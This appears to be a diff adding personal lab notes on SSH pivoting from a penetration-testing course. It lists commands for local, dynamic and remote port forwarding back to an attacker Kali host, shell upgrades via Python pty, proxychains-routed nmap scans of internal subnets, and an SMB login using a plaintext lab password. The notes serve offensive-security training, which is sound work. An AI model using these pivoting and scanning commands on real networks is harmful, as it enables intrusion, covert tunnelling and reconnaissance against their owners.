@@ -1,0 +1,62 @@
+
+Local Port forward
+
+ssh -N -L 0.0.0.0:4242:10.4.188.215:22 database_admin@10.4.188.215
+
+ssh -N -L 0.0.0.0:listener_port:internal_ip:internal_port internal_user@ip
+
+-----------------------------------------------------------------------------------------------------------
+Dynamic Port Forward
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ssh -N -D 0.0.0.0:4872 database_admin@10.4.248.215
+
+tail /etc/proxychains4.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 192.168.50.63 9999
+
+proxychains smbclient -L //172.16.248.217/ -U hr_admin --password=Welcome123
+
+proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
+
+
+proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.248.217
+
+---------------------------------------------------------------------------------------------------------
+SSH Remote Port Forwarding
+
+sudo systemctl start ssh
+
+sudo ss -ntplu
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ssh -N -R 127.0.0.1:4444:10.4.248.215:4444 kali@192.168.45.207
+
+ss -ntplu
+
+kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
+
+---------------------------------------------------------------------------------------------------------
+
+SSH Remote Dynamic Port Forwarding
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ssh -N -R 9062 kali@192.168.45.207
+
+tail /etc/proxychains4.conf
+
+# defaults set to "tor"
+socks5 127.0.0.1 9998
+
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n 192.168.248.64
+
+http://192.168.248.63:8090/exercises/ssh_remote_dynamic_client
+
+
+
